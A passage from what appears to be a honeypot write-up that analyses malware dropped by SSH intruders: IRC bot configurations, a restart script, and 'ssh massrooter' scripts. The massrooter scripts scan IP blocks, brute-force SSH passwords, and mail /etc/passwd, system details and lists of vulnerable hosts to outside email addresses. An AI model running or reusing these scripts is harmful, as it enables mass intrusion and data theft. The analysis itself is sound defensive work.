<span class="nv">goshNEW</span><span class="o">/</span><span class="nv">go</span>.<span class="nv">shB</span>
<span class="nv">goshNEW</span><span class="o">/</span><span class="nv">pass_file</span>
<span class="nv">goshNEW</span><span class="o">/</span><span class="mi">5</span>
<span class="nv">goshNEW</span><span class="o">/</span><span class="nv">userroomare</span>.<span class="nv">txt</span>
<span class="nv">goshNEW</span><span class="o">/</span><span class="mi">3</span>
<span class="nv">goshNEW</span><span class="o">/</span><span class="nv">mfu</span>.<span class="nv">txt</span>
<span class="nv">goshNEW</span><span class="o">/</span><span class="mi">4</span>
<span class="nv">goshNEW</span><span class="o">/</span><span class="nv">screen</span>
<span class="nv">goshNEW</span><span class="o">/</span><span class="nv">go</span>.<span class="nv">shA</span>

<span class="nv">server</span>:<span class="o">/</span><span class="nv">tmp</span><span class="o">/</span>,<span class="o">/</span><span class="nv">goshNEW</span># <span class="nv">screen</span>
<span class="nv">bash</span>: <span class="nv">screen</span>: <span class="nv">command</span> <span class="nv">not</span> <span class="nv">found</span>

<span class="nv">server</span>:<span class="o">/</span><span class="nv">tmp</span><span class="o">/</span>,<span class="o">/</span><span class="nv">goshNEW</span># .<span class="o">/</span><span class="nv">screen</span>
<span class="nv">Shall</span> <span class="nv">we</span> <span class="nv">play</span> <span class="nv">a</span> <span class="nv">game</span>?
<span class="nv">A</span> <span class="nv">strange</span> <span class="nv">game</span>. <span class="nv">The</span> <span class="nv">only</span> <span class="nv">winning</span> <span class="nv">move</span> <span class="nv">is</span> <span class="nv">not</span> <span class="nv">to</span> <span class="nv">play</span>.  <span class="nv">How</span> <span class="nv">about</span> <span class="nv">a</span> <span class="nv">nice</span> <span class="nv">game</span> <span class="nv">of</span> <span class="nv">chess</span>?

<span class="nv">server</span>:<span class="o">/</span><span class="nv">tmp</span><span class="o">/</span>,<span class="o">/</span><span class="nv">goshNEW</span>#

<span class="nv">server</span>:<span class="o">/</span><span class="nv">tmp</span><span class="o">/</span>,<span class="o">/</span><span class="nv">goshNEW</span># <span class="nv">apt</span><span class="o">-</span><span class="nv">get</span> <span class="nv">install</span> <span class="nv">screen</span>
<span class="nv">Reading</span> <span class="nv">package</span> <span class="nv">lists</span>... <span class="nv">Done</span>
<span class="nv">Building</span> <span class="nv">dependency</span> <span class="nv">tree</span>
<span class="nv">Reading</span> <span class="nv">state</span> <span class="nv">information</span>... <span class="nv">Done</span>
<span class="nv">The</span> <span class="nv">following</span> <span class="nv">NEW</span> <span class="nv">packages</span> <span class="nv">will</span> <span class="nv">be</span> <span class="nv">installed</span>:
  <span class="nv">screen</span>
<span class="mi">0</span> <span class="nv">upgraded</span>, <span class="mi">1</span> <span class="nv">newly</span> <span class="nv">installed</span>, <span class="mi">0</span> <span class="nv">to</span> <span class="nv">remove</span> <span class="nv">and</span> <span class="mi">259</span> <span class="nv">not</span> <span class="nv">upgraded</span>.
<span class="nv">Need</span> <span class="nv">to</span> <span class="nv">get</span> <span class="mi">774</span>.<span class="mi">2</span><span class="nv">kB</span> <span class="nv">of</span> <span class="nv">archives</span>.
<span class="nv">After</span> <span class="nv">this</span> <span class="nv">operation</span>, <span class="mi">1702</span>.<span class="mi">8</span><span class="nv">kB</span> <span class="nv">of</span> <span class="nv">additional</span> <span class="nv">disk</span> <span class="nv">space</span> <span class="nv">will</span> <span class="nv">be</span> <span class="nv">used</span>.
<span class="nv">Get</span>:<span class="mi">1</span> <span class="nv">http</span>:<span class="o">//</span><span class="nv">ftp</span>.<span class="nv">debian</span>.<span class="nv">org</span> <span class="nv">stable</span><span class="o">/</span><span class="nv">main</span> <span class="nv">tmpgoshNEWscreen</span> <span class="mi">0</span>.<span class="mi">19</span><span class="o">-</span><span class="mi">7</span> [<span class="mi">774</span>.<span class="mi">2</span><span class="nv">kB</span>]
<span class="nv">Fetched</span> <span class="mi">774</span>.<span class="mi">2</span><span class="nv">kB</span> <span class="nv">in</span> <span class="mi">1</span><span class="nv">s</span> <span class="ss">(</span><span class="mi">4493</span><span class="nv">B</span><span class="o">/</span><span class="nv">s</span><span class="ss">)</span>
<span class="nv">Reading</span> <span class="nv">package</span> <span class="nv">fields</span>... <span class="nv">Done</span>
<span class="nv">Reading</span> <span class="nv">package</span> <span class="nv">status</span>... <span class="nv">Done</span>
<span class="ss">(</span><span class="nv">Reading</span> <span class="nv">database</span> ... <span class="mi">177887</span> <span class="nv">files</span> <span class="nv">and</span> <span class="nv">directories</span> <span class="nv">currently</span> <span class="nv">installed</span>.<span class="ss">)</span>
<span class="nv">Unpacking</span> <span class="nv">tmpgoshNEWscreen</span> <span class="ss">(</span><span class="nv">from</span> ...<span class="o">/</span><span class="nv">archives</span><span class="o">/</span><span class="nv">tmpgoshNEWscreen_0</span>.<span class="mi">19</span><span class="o">-</span><span class="mi">7</span><span class="nv">_i386</span>.<span class="nv">deb</span><span class="ss">)</span> ...
<span class="nv">Processing</span> <span class="nv">triggers</span> <span class="k">for</span> <span class="nv">man</span><span class="o">-</span><span class="nv">db</span> ...
<span class="nv">Setting</span> <span class="nv">up</span> <span class="nv">tmpgoshNEWscreen</span> <span class="ss">(</span><span class="mi">0</span>.<span class="mi">19</span><span class="o">-</span><span class="mi">7</span><span class="ss">)</span> ...
<span class="nv">server</span>:<span class="o">/</span><span class="nv">tmp</span><span class="o">/</span>,<span class="o">/</span><span class="nv">goshNEW</span># <span class="nv">screen</span>
</pre></div>


<h1>Malware&nbsp;analysis</h1>
<p>Kippo also provides another handy function: it stores any downloaded files. This allows us to further analyze some of the malware used by the&nbsp;intruders.</p>
<h2>File&nbsp;http___fiunic_eu_pub.tgz</h2>
<p>An archive containing what looks like source code for an <span class="caps">SSH</span>&nbsp;server.</p>
<h2>File&nbsp;http___pinky_clan_su_mech_fast.tgz</h2>
<p>This archive contains an <span class="caps">IRC</span> bot. <code>configure.c</code> shows:</p>
<div class="highlight"><pre><span></span><span class="c1">#############CONF##############</span>
<span class="k">my</span> <span class="nv">$hidden</span> <span class="o">=</span> <span class="s">&#39;/usr/sbin/apache/log&#39;</span><span class="p">;</span>
<span class="k">my</span> <span class="nv">$linas_max</span><span class="o">=</span><span class="s">&#39;4&#39;</span><span class="p">;</span>
<span class="k">my</span> <span class="nv">$sleep</span><span class="o">=</span><span class="s">&#39;5&#39;</span><span class="p">;</span>
<span class="k">my</span> <span class="nv">@admins</span><span class="o">=</span><span class="p">(</span><span class="s">&quot;Senil&quot;</span><span class="p">,</span><span class="s">&quot;Dereglat&quot;</span><span class="p">);</span>
<span class="k">my</span> <span class="nv">@hostauth</span><span class="o">=</span><span class="p">(</span><span class="s">&quot;Senil.users.quakenet.org&quot;</span><span class="p">,</span><span class="s">&quot;Dereglat.users.quakenet.org&quot;</span><span class="p">);</span>
<span class="k">my</span> <span class="nv">@channels</span><span class="o">=</span><span class="p">(</span><span class="s">&quot;#anyone312&quot;</span><span class="p">);</span>
<span class="k">my</span> <span class="nv">$nick</span><span class="o">=</span><span class="s">&#39;bombon&#39;</span><span class="p">;</span>
<span class="k">my</span> <span class="nv">$ircname</span> <span class="o">=</span><span class="s">&#39;furt&#39;</span><span class="p">;</span>
<span class="k">my</span> <span class="nv">$realname</span> <span class="o">=</span> <span class="s">&#39;pe fatza&#39;</span><span class="p">;</span>
<span class="k">my</span> <span class="nv">$server</span><span class="o">=</span><span class="s">&#39;multiplay.uk.quakenet.org&#39;</span><span class="p">;</span>
<span class="k">my</span> <span class="nv">$port</span><span class="o">=</span><span class="s">&#39;6667&#39;</span><span class="p">;</span>
<span class="c1">##############################</span>
</pre></div>


<p>Joining the channel on Quakenet reveals&nbsp;nothing.</p>
<p>The archive also contains an executable called <code>bash</code>. This is a compiled EnergyMech <span class="caps">IRC</span> bot. The source code is also included in the archive, together with&nbsp;configuration:</p>
<div class="highlight"><pre><span></span><span class="n">SERVER</span> <span class="n">diemen</span><span class="p">.</span><span class="n">nl</span><span class="p">.</span><span class="n">eu</span><span class="p">.</span><span class="n">undernet</span><span class="p">.</span><span class="n">org</span> <span class="mi">6667</span>
<span class="n">SERVER</span> <span class="n">London2</span><span class="p">.</span><span class="n">UK</span><span class="p">.</span><span class="n">EU</span><span class="p">.</span><span class="n">Undernet</span><span class="p">.</span><span class="n">Org</span> <span class="mi">6667</span>
<span class="n">SERVER</span> <span class="mi">62</span><span class="p">.</span><span class="mi">231</span><span class="p">.</span><span class="mi">74</span><span class="p">.</span><span class="mi">10</span> <span class="mi">6667</span>
<span class="n">SERVER</span> <span class="n">lelystad</span><span class="p">.</span><span class="n">nl</span><span class="p">.</span><span class="n">eu</span><span class="p">.</span><span class="n">undernet</span><span class="p">.</span><span class="n">org</span> <span class="mi">6667</span>
<span class="n">SERVER</span> <span class="n">mesa</span><span class="p">.</span><span class="n">az</span><span class="p">.</span><span class="n">us</span><span class="p">.</span><span class="n">undernet</span><span class="p">.</span><span class="n">org</span> <span class="mi">6667</span>
<span class="n">SERVER</span> <span class="n">Zagreb</span><span class="p">.</span><span class="n">Hr</span><span class="p">.</span><span class="n">EU</span><span class="p">.</span><span class="n">UnderNet</span><span class="p">.</span><span class="n">org</span> <span class="mi">6667</span>
<span class="n">SERVER</span> <span class="n">Helsinki</span><span class="p">.</span><span class="n">FI</span><span class="p">.</span><span class="n">EU</span><span class="p">.</span><span class="n">Undernet</span><span class="p">.</span><span class="n">org</span> <span class="mi">6667</span>
<span class="n">SERVER</span> <span class="n">Carouge</span><span class="p">.</span><span class="n">CH</span><span class="p">.</span><span class="n">EU</span><span class="p">.</span><span class="n">Undernet</span><span class="p">.</span><span class="n">org</span> <span class="mi">6667</span>
<span class="n">SERVER</span> <span class="n">us</span><span class="p">.</span><span class="n">undernet</span><span class="p">.</span><span class="n">org</span> <span class="mi">6667</span>
<span class="n">SERVER</span> <span class="n">oslo2</span><span class="p">.</span><span class="k">no</span><span class="p">.</span><span class="n">eu</span><span class="p">.</span><span class="n">undernet</span><span class="p">.</span><span class="n">org</span> <span class="mi">6667</span>
<span class="n">ENTITY</span> <span class="n">x</span>

<span class="o">###</span><span class="n">BOT</span> <span class="mi">1</span><span class="o">###</span>
<span class="n">NICK</span> <span class="n">Red</span><span class="o">-</span><span class="n">hack1</span>
<span class="n">USERFILE</span> <span class="mi">1</span><span class="p">.</span><span class="k">user</span>
<span class="n">CMDCHAR</span> <span class="p">.</span>
<span class="n">LOGIN</span> <span class="n">rosu</span>
<span class="n">IRCNAME</span>  <span class="mi">4</span><span class="err">Â®</span>  <span class="mi">12</span><span class="n">Welcome</span>  <span class="mi">3</span><span class="k">in</span>  <span class="mi">14</span><span class="n">My</span>  <span class="mi">4</span><span class="n">World</span> <span class="mi">13</span><span class="o">!!!</span>  <span class="mi">7</span><span class="err">Â®</span>
<span class="n">MODES</span> <span class="o">+</span><span class="n">ix</span><span class="o">-</span><span class="n">ws</span>
<span class="n">HASONOTICE</span>
<span class="n">TOG</span> <span class="n">CC</span>          <span class="mi">1</span>
<span class="n">TOG</span> <span class="n">CLOAK</span>       <span class="mi">1</span>
<span class="n">TOG</span> <span class="n">SPY</span>         <span class="mi">1</span>
<span class="k">SET</span> <span class="n">OPMODES</span>     <span class="mi">6</span>
<span class="k">SET</span> <span class="n">BANMODES</span>    <span class="mi">6</span>
<span class="n">CHANNEL</span>         <span class="o">#</span><span class="n">canalul</span><span class="o">-</span><span class="n">tau</span>
<span class="n">TOG</span> <span class="n">PUB</span>         <span class="mi">1</span>
<span class="n">TOG</span> <span class="n">MASS</span>        <span class="mi">1</span>
<span class="n">TOG</span> <span class="n">SHIT</span>        <span class="mi">1</span>
<span class="n">TOG</span> <span class="n">PROT</span>        <span class="mi">1</span>
<span class="n">TOG</span> <span class="n">ENFM</span>        <span class="mi">0</span>
<span class="k">SET</span> <span class="n">MKL</span>         <span class="mi">7</span>
<span class="k">SET</span> <span class="n">MBL</span>         <span class="mi">7</span>
<span class="k">SET</span> <span class="n">MPL</span>         <span class="mi">1</span>
</pre></div>


<p>Also here, joining the channel does&nbsp;nothing.</p>
<p>The archive also contains a shell script, used to check if the bot is still running and to restart&nbsp;it:</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="ch">#! /bin/sh</span>
<span class="nv">RUN</span><span class="o">=</span>./bash
<span class="nv">OPT</span><span class="o">=</span>
<span class="nv">OUTPUT</span><span class="o">=</span>./mech.cron
<span class="k">if</span> <span class="o">[</span> -r mech.pid <span class="o">]</span><span class="p">;</span> <span class="k">then</span>
  <span class="nv">PID</span><span class="o">=</span><span class="sb">`</span>cat mech.pid<span class="sb">`</span>
  <span class="k">if</span> <span class="o">[</span> -r /proc/<span class="nv">$PID</span> <span class="o">]</span><span class="p">;</span> <span class="k">then</span>
    <span class="nb">exit</span> <span class="m">0</span>
  <span class="k">fi</span>
  <span class="k">if</span> <span class="o">(</span> <span class="nb">kill</span> -0 <span class="nv">$PID</span> <span class="m">1</span>&gt; /dev/null <span class="m">2</span>&gt; /dev/null <span class="o">)</span><span class="p">;</span> <span class="k">then</span>
    <span class="nb">exit</span> <span class="m">0</span>
  <span class="k">fi</span>
<span class="k">fi</span>
<span class="nb">echo</span> &gt;&gt; <span class="nv">$OUTPUT</span>
<span class="nb">echo</span> <span class="s2">&quot;Mech restarted:&quot;</span> &gt;&gt; <span class="nv">$OUTPUT</span>
<span class="o">(</span> date <span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span> <span class="o">)</span> &gt;&gt; <span class="nv">$OUTPUT</span>
<span class="nb">echo</span> &gt;&gt; <span class="nv">$OUTPUT</span>
<span class="o">(</span> <span class="nv">$RUN</span> <span class="nv">$OPT</span> <span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span> <span class="o">)</span> &gt;&gt; <span class="nv">$OUTPUT95</span>
</pre></div>
</td></tr></table>

<p>Shell scripts like these are often put in&nbsp;crontabs.</p>
<h2>File&nbsp;http___arhiva_do_am_scan.tar</h2>
<p>This archive contains the often repacked <code>pscan</code> and <code>ssh-scan</code> tools. A shell script called <code>start</code> contains:</p>
<div class="highlight"><pre><span></span>#<span class="o">/</span><span class="nv">bin</span><span class="o">/</span><span class="nv">bash</span>
# <span class="nv">start</span>.<span class="nv">sh</span> <span class="nv">script</span>
# <span class="nv">part</span> <span class="nv">of</span> <span class="nv">ssh</span> <span class="nv">massrooter</span> <span class="nv">by</span> <span class="nv">pulea</span>
# <span class="o">/</span><span class="nv">j</span> #<span class="nv">r</span>.<span class="nv">o</span>.<span class="nv">o</span>.<span class="nv">t</span> <span class="nv">pt</span> <span class="nv">intrebari</span> :<span class="ss">)</span>

<span class="k">if</span> [ $# <span class="o">!=</span> <span class="mi">1</span> ]<span class="c1">; then</span>
        <span class="nv">echo</span> <span class="s2">&quot;</span><span class="s">[+] pulea zice :</span><span class="s2">&quot;</span>
<span class="nv">sleep</span> <span class="mi">3</span>
        <span class="nv">echo</span> <span class="s2">&quot;</span><span class="s">[+] sa-mi bag pula in creierii tai !</span><span class="s2">&quot;</span>
        <span class="nv">echo</span> <span class="s2">&quot;</span><span class="s">[+] ex. : $0 &lt;b class&gt;</span><span class="s2">&quot;</span>
        <span class="k">exit</span><span class="c1">;</span>
<span class="nv">fi</span>

<span class="nv">clear</span>
<span class="nv">cat</span> <span class="nv">a1</span>
<span class="k">if</span> [ <span class="o">-</span><span class="nv">f</span> <span class="nv">a4</span> ]<span class="c1">; then</span>
<span class="nv">echo</span> <span class="s2">&quot;</span><span class="s">[+] Checking files..</span><span class="s2">&quot;</span>
<span class="nv">sleep</span> <span class="mi">3</span>
<span class="nv">echo</span> <span class="s2">&quot;</span><span class="s"> OK</span><span class="s2">&quot;</span>
<span class="nv">perl</span> <span class="nv">sshc</span>.<span class="nv">c</span>

.<span class="o">/</span><span class="nv">a</span> <span class="mh">$1</span>.<span class="mi">0</span>
.<span class="o">/</span><span class="nv">a</span> <span class="mh">$1</span>.<span class="mi">1</span>
.<span class="o">/</span><span class="nv">a</span> <span class="mh">$1</span>.<span class="mi">2</span>
.<span class="o">/</span><span class="nv">a</span> <span class="mh">$1</span>.<span class="mi">3</span>
.<span class="o">/</span><span class="nv">a</span> <span class="mh">$1</span>.<span class="mi">4</span>
.<span class="o">/</span><span class="nv">a</span> <span class="mh">$1</span>.<span class="mi">5</span>
.<span class="o">/</span><span class="nv">a</span> <span class="mh">$1</span>.<span class="mi">6</span>
.<span class="o">/</span><span class="nv">a</span> <span class="mh">$1</span>.<span class="mi">7</span>
.<span class="o">/</span><span class="nv">a</span> <span class="mh">$1</span>.<span class="mi">8</span>
.<span class="o">/</span><span class="nv">a</span> <span class="mh">$1</span>.<span class="mi">9</span>
.<span class="o">/</span><span class="nv">a</span> <span class="mh">$1</span>.<span class="mi">10</span>
.<span class="o">/</span><span class="nv">a</span> <span class="mh">$1</span>.<span class="mi">11</span>
.<span class="o">/</span><span class="nv">a</span> <span class="mh">$1</span>.<span class="mi">12</span>
.<span class="o">/</span><span class="nv">a</span> <span class="mh">$1</span>.<span class="mi">13</span>
.<span class="o">/</span><span class="nv">a</span> <span class="mh">$1</span>.<span class="mi">14</span>
.<span class="o">/</span><span class="nv">a</span> <span class="mh">$1</span>.<span class="mi">15</span>
.<span class="o">/</span><span class="nv">a</span> <span class="mh">$1</span>.<span class="mi">16</span>
.<span class="o">/</span><span class="nv">a</span> <span class="mh">$1</span>.<span class="mi">17</span>
.<span class="o">/</span><span class="nv">a</span> <span class="mh">$1</span>.<span class="mi">18</span>
.<span class="o">/</span><span class="nv">a</span> <span class="mh">$1</span>.<span class="mi">19</span>
.<span class="o">/</span><span class="nv">a</span> <span class="mh">$1</span>.<span class="mi">20</span>

<span class="nv">cat</span> <span class="nv">vuln</span>.<span class="nv">txt</span> <span class="o">|</span><span class="nv">mail</span> <span class="o">-</span><span class="nv">s</span> <span class="s2">&quot;</span><span class="s">vuln.txt</span><span class="s2">&quot;</span> <span class="nv">luchian8</span>@<span class="nv">gmail</span>.<span class="nv">com</span>

#<span class="nv">SNIP</span>

<span class="nv">rm</span> <span class="o">-</span><span class="nv">rf</span> <span class="nv">sshc</span>.<span class="nv">c</span>
<span class="nv">killall</span> <span class="o">-</span><span class="mi">9</span> <span class="nv">a</span>
<span class="nv">killall</span> <span class="o">-</span><span class="mi">9</span> <span class="nv">a</span>
<span class="nv">killall</span> <span class="o">-</span><span class="mi">9</span> <span class="nv">pscan2</span>
<span class="k">if</span> [ <span class="s2">&quot;</span><span class="s">$(whoami)</span><span class="s2">&quot;</span> <span class="o">!=</span> <span class="s2">&quot;</span><span class="s">root</span><span class="s2">&quot;</span> ]<span class="c1">; then</span>
.<span class="o">/</span><span class="nv">sshf</span>
<span class="k">else</span>
.<span class="o">/</span><span class="nv">sshf0</span>
<span class="nv">fi</span>
<span class="nv">clear</span>
<span class="nv">echo</span> <span class="s2">&quot;</span><span class="s">[+] momentul adevarului :)</span><span class="s2">&quot;</span>
<span class="nv">echo</span> <span class="s2">&quot;</span><span class="s">[+] ne odihnim cateva secunde ..</span><span class="s2">&quot;</span>
<span class="nv">sleep</span> <span class="mi">5</span>
<span class="nv">echo</span> <span class="s2">&quot;&quot;</span>
<span class="nv">cat</span> <span class="nv">vuln</span>.<span class="nv">txt</span>
<span class="nv">cat</span> <span class="nv">vuln</span>.<span class="nv">txt</span> <span class="o">&gt;&gt;</span> .<span class="nv">vulnold</span>.<span class="nv">txt</span>
<span class="nv">echo</span> <span class="o">&gt;</span> <span class="nv">vuln</span>.<span class="nv">txt</span>
<span class="nv">cat</span> <span class="nv">a6</span> <span class="o">&gt;&gt;</span> <span class="nv">vuln</span>.<span class="nv">txt</span>
<span class="k">else</span>
<span class="nv">echo</span> <span class="s2">&quot;</span><span class="s">[+] Checking files..</span><span class="s2">&quot;</span>
<span class="nv">sleep</span> <span class="mi">3</span>
<span class="nv">echo</span> <span class="s2">&quot;</span><span class="s"> error</span><span class="s2">&quot;</span>
<span class="nv">echo</span> <span class="s2">&quot;</span><span class="s">[+] Some file are missing</span><span class="s2">&quot;</span>
<span class="nv">echo</span> <span class="s2">&quot;</span><span class="s">[+] Please reinistall it from your wget</span><span class="s2">&quot;</span>
<span class="nv">echo</span> <span class="s2">&quot;</span><span class="s">[+] or ask pulea !</span><span class="s2">&quot;</span>
</pre></div>


<p>I wonder who this luchian8@gmail.com is&#8230; Anyway, <code>a</code> is another shell script&nbsp;running:</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="ch">#!/bin/bash</span>

./pscan2 <span class="nv">$1</span> <span class="m">22</span>
sleep <span class="m">5</span>
cat <span class="nv">$1</span>.pscan.22 <span class="p">|</span>sort <span class="p">|</span>uniq &gt; mfu.txt
<span class="nv">oopsnr2</span><span class="o">=</span><span class="sb">`</span>grep -c . mfu.txt<span class="sb">`</span>
<span class="nb">echo</span> <span class="s2">&quot;&quot;</span>
<span class="nb">echo</span> <span class="s2">&quot;[+] Attacking </span><span class="nv">$oopsnr2</span><span class="s2"> servers!&quot;</span>
<span class="nb">echo</span> <span class="s2">&quot;&quot;</span>
perl sshc.c
rm -rf sshc.c
./pass_sh
./ssh-scan <span class="m">100</span>
rm -rf <span class="nv">$1</span>.pscan.22 mfu.txt
<span class="nb">echo</span> <span class="s2">&quot;&quot;</span>
</pre></div>
</td></tr></table>

<p><code>pscan</code> is a basic port scanner for an <span class="caps">IP</span> block. <code>ssh-scan</code> is a password brute forcer. Other files just contain some dubious ascii&nbsp;art:</p>
<div class="highlight"><pre><span></span> <span class="n">__</span><span class="o">^</span><span class="n">__</span>                                                              <span class="n">__</span><span class="o">^</span><span class="n">__</span>
<span class="p">(</span> <span class="n">___</span> <span class="p">)</span><span class="c1">------------------------------------------------------------( ___ )</span>
 <span class="o">|</span> <span class="o">/</span> <span class="o">|</span>               <span class="o">#</span><span class="n">help</span><span class="o">-</span><span class="n">bnc</span> <span class="n">present</span><span class="o">`</span><span class="n">s</span><span class="p">:</span>                           <span class="o">|</span> <span class="err">\</span> <span class="o">|</span>
 <span class="o">|</span> <span class="o">/</span> <span class="o">|</span>       <span class="n">OmAr</span><span class="s1">&#39;z ssh massrooter build on 11-01-2006              | \ |</span>
<span class="s1"> | / |                                                              | \ |</span>
<span class="s1"> | / |                  Thanks to :  OmAr                           | \ |</span>
<span class="s1"> | / |                 and to all #OmAr members.                    | \ |</span>
<span class="s1"> | / |                                                              | \ |</span>
<span class="s1"> | / |    Fucks goes to : all hackers, we are script kiddies..      | \ |</span>
<span class="s1"> | / |                    so what ? fuck off !                      | \ |</span>
<span class="s1"> | / |                                                              | \ |</span>
<span class="s1"> | / |                      EOF by OmAr                             | \ |</span>
<span class="s1"> | / |--------------------------------------------------------------| \ |</span>
<span class="s1"> |___|______________[OmAr&#39;</span><span class="n">z</span> <span class="n">ssh</span> <span class="n">massrooter</span> <span class="k">by</span> <span class="n">OmAr</span><span class="p">]</span><span class="n">_________________</span><span class="o">|</span><span class="n">___</span><span class="o">|</span>
<span class="p">(</span><span class="n">_____</span><span class="p">)</span><span class="c1">------------------------------------------------------------(_____)</span>
   <span class="o">^</span>                                                                  <span class="o">^</span>
</pre></div>


<h2>File&nbsp;http___gblteam_webs_com_gosh.tgz.tar</h2>
<p>Another repackaging of the <code>pscan</code>-<code>ssh-scan</code> combination. This one contains a script called <code>secure</code>:</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2
3
4
5
6
7
8</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="ch">#!/bin/bash</span>
<span class="k">if</span> <span class="o">[</span> <span class="sb">`</span>whoami<span class="sb">`</span> <span class="o">==</span> <span class="s2">&quot;root&quot;</span> <span class="o">]</span><span class="p">;</span> <span class="k">then</span>
chmod -x /usr/bin/mail
mv /usr/bin/mail /usr/bin/s8
<span class="nb">echo</span> <span class="s2">&quot; Done , You can scan now &quot;</span>
<span class="k">else</span>
<span class="nb">echo</span> -e <span class="s2">&quot; you&#39;re not root you&#39;re `whoami` with id `id` !! &quot;</span>
<span class="k">fi</span>
</pre></div>
</td></tr></table>

<p>&#8230; because disabling <code>mail</code> totally hides your tracks,&nbsp;yo.</p>
<p>The script <code>scam</code> contains a variation of the script seen&nbsp;above:</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="ch">#!/bin/bash</span>
<span class="nb">echo</span> <span class="s2">&quot;[+] [+] [+] RK [+] [+] [+]&quot;</span> &gt;&gt; info2
<span class="nb">echo</span> <span class="s2">&quot;[+] [+] [+] IP [+] [+] [+]&quot;</span> &gt;&gt; info2
/sbin/ifconfig -a &gt;&gt; info2
<span class="nb">echo</span> <span class="s2">&quot;[+] [+] [+] uptime [+] [+] [+]&quot;</span> &gt;&gt; info2
uptime &gt;&gt; info2
<span class="nb">echo</span> <span class="s2">&quot;[+] [+] [+] uname -a [+] [+] [+]&quot;</span> &gt;&gt; info2
uname -a &gt;&gt; info2
<span class="nb">echo</span> <span class="s2">&quot;[+] [+] [+] /etc/issue [+] [+] [+]&quot;</span> &gt;&gt; info2
cat /etc/issue &gt;&gt; info2
<span class="nb">echo</span> <span class="s2">&quot;[+] [+] [+] passwd [+] [+] [+]&quot;</span> &gt;&gt; info2
cat /etc/passwd &gt;&gt; info2
<span class="nb">echo</span> <span class="s2">&quot;[+] [+] [+] id [+] [+] [+]&quot;</span> &gt;&gt; info2
id &gt;&gt; info2
<span class="nb">echo</span> <span class="s2">&quot;[+] [+] [+] Spatiu Hdd / pwd [+] [+] [+]&quot;</span> &gt;&gt; info2
df -h &gt;&gt; info2
<span class="nb">pwd</span> &gt;&gt; info2
cat info2 <span class="p">|</span> mail -s <span class="s2">&quot;Scanner MaLa Port : ?? | Pass : stii tu :))&quot;</span> mafia89tm@yahoo.com
rm -rf info2
clear

<span class="nb">echo</span> <span class="s2">&quot;####################################################################&quot;</span>
<span class="nb">echo</span> <span class="s2">&quot;#                          ______                                  &quot;</span>
<span class="nb">echo</span> <span class="s2">&quot;#                        .-.      .-.                               &quot;</span>
<span class="nb">echo</span> <span class="s2">&quot;#                       /            \                              &quot;</span>
<span class="nb">echo</span> <span class="s2">&quot;#                      |     zRR      |                             &quot;</span>
<span class="nb">echo</span> <span class="s2">&quot;#                      |,  .-.  .-.  ,|                             &quot;</span>
<span class="nb">echo</span> <span class="s2">&quot;#                      | )(z_/  \z_)( |                             &quot;</span>
<span class="nb">echo</span> <span class="s2">&quot;#                      |/     /\     \|                             &quot;</span>
<span class="nb">echo</span> <span class="s2">&quot;#              _       (_     ^^     _)                             &quot;</span>
<span class="nb">echo</span> <span class="s2">&quot;#      _\ ____) \_______\__|IIIIII|__/_________________________     &quot;</span>
<span class="nb">echo</span> <span class="s2">&quot;#     (_)[___]{}&lt;________|-\IIIIII/-|__zRR__zRR__zRR___________\    &quot;</span>
<span class="nb">echo</span> <span class="s2">&quot;#       /     )_/        \          /                               &quot;</span>
<span class="nb">echo</span> <span class="s2">&quot;#                         \ ______ /                              &quot;</span>
<span class="nb">echo</span> <span class="s2">&quot;#                         SCANER PRIVAT                             &quot;</span>
<span class="nb">echo</span> <span class="s2">&quot;#             SCANER FOLOSIT DOAR DE TEAMUL MaLaSorTe               &quot;</span>
<span class="nb">echo</span> <span class="s2">&quot;#            SACNERUL CONTINE UN PASS_FLIE DE 3MEGA !!              &quot;</span>
<span class="nb">echo</span> <span class="s2">&quot;####################################################################&quot;</span>

<span class="k">if</span> <span class="o">[</span> -f a <span class="o">]</span><span class="p">;</span> <span class="k">then</span>
cat vuln.txt <span class="p">|</span>mail -s <span class="s2">&quot;Lame Gang Us Roots&quot;</span> mafia89tm@yahoo.com
./a <span class="nv">$1</span>.0
./a <span class="nv">$1</span>.1
./a <span class="nv">$1</span>.2
./a <span class="nv">$1</span>.3
./a <span class="nv">$1</span>.4
./a <span class="nv">$1</span>.5
./a <span class="nv">$1</span>.6
./a <span class="nv">$1</span>.7
./a <span class="nv">$1</span>.8
./a <span class="nv">$1</span>.9
./a <span class="nv">$1</span>.10
cat vuln.txt <span class="p">|</span>mail -s <span class="s2">&quot;Lame Gang Us Roots&quot;</span> mafia89tm@yahoo.com

<span class="c1"># SNIP</span>
killall -9 a
<span class="k">else</span>
<span class="nb">echo</span> <span class="c1"># Ciudat ..Nu Ai Urmat Instructiunile  #</span>
<span class="nb">echo</span> <span class="c1"># trebui dat mv assh a sau mv scan a   #</span>
<span class="nb">echo</span> <span class="c1"># orice ai avea tu ... dohh ..         #</span>
killall -9 a
killall -9 pscan2
<span class="k">fi</span>
</pre></div>
</td></tr></table>

<p>&#8230; because writing a for-loop is too hard. I wonder who mafia89tm@yahoo.com is. Also, if you disable <code>mail</code>, how does <code>mail</code> work,&nbsp;exactly?</p>
<h2>File:&nbsp;http___no_biju_com_merge_Arhive_devilflood.tar.gz</h2>
<p>A package containing executables, probably used to DoS servers. <span class="caps">TCP</span>, <span class="caps">UDP</span>, <span class="caps">IRC</span> and <span class="caps">SMTP</span> flooders are present. There is a list of <span class="caps">IP</span> addresses in a txt file, probably&nbsp;targets.</p>
<p>There are also a few configuration files with Undernet <span class="caps">IRC</span> channels, but joining them reveals no&nbsp;users.</p>
